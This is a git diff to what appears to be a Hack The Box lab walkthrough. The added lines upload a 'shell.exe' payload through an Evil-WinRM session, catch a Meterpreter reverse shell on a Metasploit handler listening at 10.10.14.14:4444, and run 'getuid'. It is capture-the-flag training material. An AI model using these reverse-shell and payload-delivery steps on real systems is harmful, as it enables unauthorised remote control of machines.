@@ -252,4 +252,19 @@ msf6 exploit(multi/handler) > run
 [*] Started reverse TCP handler on 10.10.14.14:4444
 ```
 
-Upload and Execute the `shell.exe` on the target machine using the existing WinRM session.
+Upload and Execute the `shell.exe` on the target machine using the existing Evil WinRM session.
+```CSS
+*Evil-WinRM* PS C:\Users\tony\Documents> upload shell.exe C:\programdata\shell.exe
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/cd736525-6822-4b28-8b96-80b28c4158cc)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c9e0fdc5-608d-499a-a25e-447e09b85a7f)
+
+Meterpreter session received
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/f36b208d-6133-48e2-889e-df98d08e2b45)
+
+Get the UID
+```
+meterpreter > getuid
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2c032730-0789-4a96-a9d8-233f0b9eefd4)
+
